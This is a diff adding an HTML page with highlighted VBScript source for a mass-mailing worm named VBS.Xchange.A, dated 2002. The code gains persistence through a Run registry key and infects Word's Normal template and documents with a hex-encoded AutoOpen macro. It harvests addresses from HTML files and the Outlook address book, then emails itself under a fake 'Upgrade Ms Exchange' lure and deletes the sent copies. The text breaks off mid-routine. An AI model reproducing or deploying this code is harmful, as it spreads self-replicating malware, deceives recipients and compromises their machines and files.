@@ -1,0 +1,276 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>20020427 - VBS.Xchange.A</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+}
+.sc7 {
+}
+.sc11 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">' Name : VBS.Xchange.A
+' Author : PetiK
+' Language : VBS
+' Date : 27/04/2002
+</span><span class="sc0">
+</span><span class="sc1">'VBS.Xchange.A
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ws</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fl</span><span class="sc6">=</span><span class="sc7">fso.OpenTextFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullname</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">virus</span><span class="sc6">=</span><span class="sc7">fl.ReadAll</span><span class="sc0">
+</span><span class="sc7">fl.Close</span><span class="sc0">
+
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">win</span><span class="sc6">=</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">fcopy</span><span class="sc6">=</span><span class="sc7">win&amp;</span><span class="sc4">"\MSXchange.vbs"</span><span class="sc0">
+</span><span class="sc7">reg</span><span class="sc6">=</span><span class="sc4">"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc0">
+</span><span class="sc7">fso.GetFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullName</span><span class="sc6">).</span><span class="sc7">Copy</span><span class="sc6">(</span><span class="sc7">fcopy</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc7">reg&amp;</span><span class="sc4">"\MsExchange"</span><span class="sc6">,</span><span class="sc7">fcopy</span><span class="sc0">
+
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">sp</span><span class="sc6">=</span><span class="sc7">fso.CreateTextFile</span><span class="sc6">(</span><span class="sc4">"C:\XChange.vba"</span><span class="sc6">,</span><span class="sc3">True</span><span class="sc6">,</span><span class="sc2">8</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Attribute VB_Name = ""Xchange"""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Sub AutoOpen()"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"On Error Resume Next"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"e = """""</span><span class="sc0">
+
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">=</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">len</span><span class="sc6">(</span><span class="sc7">virus</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc11">e</span><span class="sc6">=</span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">virus</span><span class="sc6">,</span><span class="sc7">i</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc11">e</span><span class="sc6">=</span><span class="sc7">Hex</span><span class="sc6">(</span><span class="sc7">Asc</span><span class="sc6">(</span><span class="sc11">e</span><span class="sc6">))</span><span class="sc0">
+
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc11">e</span><span class="sc6">)=</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc11">e</span><span class="sc6">=</span><span class="sc4">"0"</span><span class="sc6">&amp;</span><span class="sc11">e</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+
+</span><span class="sc7">f</span><span class="sc6">=</span><span class="sc7">f</span><span class="sc6">+</span><span class="sc11">e</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">f</span><span class="sc6">)=</span><span class="sc2">110</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"e = e + """</span><span class="sc6">+</span><span class="sc7">f</span><span class="sc6">+</span><span class="sc4">""""</span><span class="sc0">
+</span><span class="sc7">f</span><span class="sc6">=</span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">virus</span><span class="sc6">)-</span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"e = e + """</span><span class="sc6">+</span><span class="sc7">f</span><span class="sc6">+</span><span class="sc4">""""</span><span class="sc0">
+</span><span class="sc7">f</span><span class="sc6">=</span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+
+</span><span class="sc3">Next</span><span class="sc0">
+
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"read=dec(e)"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Open ""C:\xchange.vbs"" For Output As #1"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Print #1, read"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Close #1"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Shell ""wscript C:\xchange.vbs"""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Call infect_fichier"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"End Sub"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Sub HelpAbout()"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"On Error Resume Next"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"MsgBox ""This is my very first VBS-W97M Worm"", vbInformation, ""I-Worm.Xchange"""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"End Sub"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Sub AutoClose()"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"On Error Resume Next"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"FileSystem.Kill ""C:\xchange.vbs"""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"End Sub"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Sub infect_fichier()"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"On Error Resume Next"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Set nor = NormalTemplate.VBProject.VBComponents"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Set doc = ActiveDocument.VBProject.VBComponents"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"df = ""C:\XChange.vba"""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"If nor.Item(""Xchange"").Name &lt;&gt; ""Xchange"" Then"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"   doc(""Xchange"").Export df"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"   nor.Import df"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"End If"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"If doc.Item(""Xchange"").Name &lt;&gt; ""Xchange"" Then"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"   nor(""Xchange"").Export df"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"   doc.Import df"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"   ActiveDocument.Save"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"End If"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"End Sub"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Function dec(octe)"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"For hexad = 1 To Len(octe) Step 2"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"dec = dec &amp; Chr(""&amp;h"" &amp; Mid(octe, hexad, 2))"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Next"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"End Function"</span><span class="sc0">
+</span><span class="sc7">sp.Close</span><span class="sc0">
+
+</span><span class="sc7">infvbs</span><span class="sc6">(</span><span class="sc7">win</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">infvbs</span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0">
+
+</span><span class="sc7">SendWithOutlook</span><span class="sc6">()</span><span class="sc0">
+
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">wd</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Word.Application"</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\MsXchange"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"Coded by PetiK (c)2002"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">CN</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.NetWork"</span><span class="sc6">).</span><span class="sc7">ComputerName</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">srch</span><span class="sc6">=</span><span class="sc7">wd.Application.FileSearch</span><span class="sc0">
+</span><span class="sc7">srch.Lookin</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"C:\"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">srch.SearchSubFolders</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">srch.FileName</span><span class="sc6">=</span><span class="sc4">"*.doc;*.dot"</span><span class="sc6">:</span><span class="sc0">
+</span><span class="sc7">srch.Execute</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">sp</span><span class="sc6">=</span><span class="sc7">fso.OpenTextFile</span><span class="sc6">(</span><span class="sc7">fcopy</span><span class="sc6">,</span><span class="sc2">8</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"'On "</span><span class="sc6">&amp;</span><span class="sc3">date&amp;</span><span class="sc0"> </span><span class="sc4">" at "</span><span class="sc6">&amp;</span><span class="sc7">time&amp;</span><span class="sc4">" from "</span><span class="sc6">&amp;</span><span class="sc7">CN</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"'Number of DOC and DOT file found : "</span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">srch.FoundFiles.Count</span><span class="sc0">
+</span><span class="sc7">sp.WriteBlankLines</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">sp.Close</span><span class="sc0">
+</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKLM\Software\Microsoft\MsXchange"</span><span class="sc6">,</span><span class="sc4">"Coded by PetiK (c)2002"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">vba</span><span class="sc6">=</span><span class="sc7">wd.NormalTemplate.VBProject.VBComponents</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">vba.Item</span><span class="sc6">(</span><span class="sc4">"Xchange"</span><span class="sc6">).</span><span class="sc11">Name</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"Xchange"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+   </span><span class="sc7">vba.Import</span><span class="sc0"> </span><span class="sc4">"C:\XChange.vba"</span><span class="sc0">
+   </span><span class="sc7">wd.Application.NormalTemplate.Save</span><span class="sc0">
+   </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc7">wd.Application.NormalTemplate.Close</span><span class="sc0">
+</span><span class="sc7">wd.Application.Quit</span><span class="sc0">
+
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">mel</span><span class="sc6">=</span><span class="sc7">fso.CreateTextFile</span><span class="sc6">(</span><span class="sc7">win&amp;</span><span class="sc4">"\kitep.wab.txt"</span><span class="sc6">,</span><span class="sc2">8</span><span class="sc6">,</span><span class="sc3">TRUE</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">counter</span><span class="sc6">=</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc7">lect</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">mel.WriteLine</span><span class="sc0"> </span><span class="sc4">"#"</span><span class="sc0">
+</span><span class="sc7">mel.Close</span><span class="sc0">
+</span><span class="sc7">WScript.Quit</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">lect</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">dr</span><span class="sc6">=</span><span class="sc7">fso.Drives</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">d</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">dr</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">d.DriveType</span><span class="sc6">=</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">d.DriveType</span><span class="sc6">=</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">list</span><span class="sc6">(</span><span class="sc7">d.path&amp;</span><span class="sc4">"\"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">spreadmailto</span><span class="sc6">(</span><span class="sc7">dir</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc6">=</span><span class="sc7">fso.GetFolder</span><span class="sc6">(</span><span class="sc7">dir</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">cf</span><span class="sc6">=</span><span class="sc7">f.Files</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">fil</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">cf</span><span class="sc0">
+</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc7">fso.GetExtensionName</span><span class="sc6">(</span><span class="sc7">fil.path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc7">lcase</span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"htm"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"html"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"htt"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"asp"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">htm</span><span class="sc6">=</span><span class="sc7">fso.OpenTextFile</span><span class="sc6">(</span><span class="sc7">fil.path</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">verif</span><span class="sc6">=</span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc7">allhtm</span><span class="sc6">=</span><span class="sc7">htm.ReadAll</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">htm.Close</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">ml</span><span class="sc6">=</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">allhtm</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">count</span><span class="sc6">=</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">allhtm</span><span class="sc6">,</span><span class="sc7">ml</span><span class="sc6">,</span><span class="sc2">7</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"mailto:"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">counter</span><span class="sc6">=</span><span class="sc7">counter</span><span class="sc6">+</span><span class="sc2">1</span><span class="sc0">
+</span><span class="sc7">mlto</span><span class="sc6">=</span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">allhtm</span><span class="sc6">,</span><span class="sc7">ml</span><span class="sc6">+</span><span class="sc2">6+c</span><span class="sc7">ount</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0">
+</span><span class="sc7">count</span><span class="sc6">=</span><span class="sc7">count</span><span class="sc6">+</span><span class="sc2">1</span><span class="sc0">
+</span><span class="sc7">mlto</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">mlto</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">allhtm</span><span class="sc6">,</span><span class="sc7">ml</span><span class="sc6">+</span><span class="sc2">6+c</span><span class="sc7">ount</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">loop</span><span class="sc0">
+</span><span class="sc7">mel.WriteLine</span><span class="sc0"> </span><span class="sc7">counter</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc4">" &lt;"</span><span class="sc6">&amp;</span><span class="sc7">left</span><span class="sc6">(</span><span class="sc7">mlto</span><span class="sc6">,</span><span class="sc7">len</span><span class="sc6">(</span><span class="sc7">mlto</span><span class="sc6">)-</span><span class="sc2">1</span><span class="sc6">)&amp;</span><span class="sc4">"&gt;"</span><span class="sc0">
+
+</span><span class="sc7">sendmailto</span><span class="sc6">(</span><span class="sc7">left</span><span class="sc6">(</span><span class="sc7">mlto</span><span class="sc6">,</span><span class="sc7">len</span><span class="sc6">(</span><span class="sc7">mlto</span><span class="sc6">)-</span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0">
+
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+
+</span><span class="sc3">Next</span><span class="sc0">
+
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">list</span><span class="sc6">(</span><span class="sc7">dir</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc6">=</span><span class="sc7">fso.GetFolder</span><span class="sc6">(</span><span class="sc7">dir</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ssf</span><span class="sc6">=</span><span class="sc7">f.SubFolders</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">fil</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">ssf</span><span class="sc0">
+</span><span class="sc7">spreadmailto</span><span class="sc6">(</span><span class="sc7">fil.path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">list</span><span class="sc6">(</span><span class="sc7">fil.path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">sendmailto</span><span class="sc6">(</span><span class="sc7">email</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">out</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">mailmelto</span><span class="sc6">=</span><span class="sc7">out.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">mailmelto.To</span><span class="sc0"> </span><span class="sc7">email</span><span class="sc0">
+</span><span class="sc7">mailmelto.Subject</span><span class="sc0"> </span><span class="sc4">"Upgrade Ms Exchange"</span><span class="sc0">
+</span><span class="sc7">mailmelto.Body</span><span class="sc0"> </span><span class="sc4">"Run this attached file to upgrade Ms Exchange"</span><span class="sc0">
+</span><span class="sc7">mailmelto.Attachment.Add</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullName</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">mailmelto.DeleteAfterSubmit</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc7">mailmelto.Send</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">out</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Nothing</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">SendWithOutlook</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc11">A</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc11">B</span><span class="sc6">=</span><span class="sc7">A.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc11">C</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">B.AddressLists</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">C.AddressEntries.Count</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">D</span><span class="sc6">=</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">C.AddressEntries.count</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc11">E</span><span class="sc6">=</span><span class="sc7">C.AddressEntries</span><span class="sc6">(</span><span class="sc7">D</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">F</span><span class="sc6">=</span><span class="sc7">A.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">F.To</span><span class="sc6">=</span><span class="sc7">E.Address</span><span class="sc0">
+</span><span class="sc7">F.Subject</span><span class="sc6">=</span><span class="sc4">"Update and upgrade MS Exchange."</span><span class="sc0">
+</span><span class="sc7">F.Body</span><span class="sc6">=</span><span class="sc4">"run this attached file to update Ms Exchange. See you soon."</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">G</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">F.Attachments.Add</span><span class="sc6">(</span><span class="sc7">fcopy</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">F.DeleteAfterSubmit</span><span class="sc6">=</span><span class="sc3">True</span><span class="sc0">
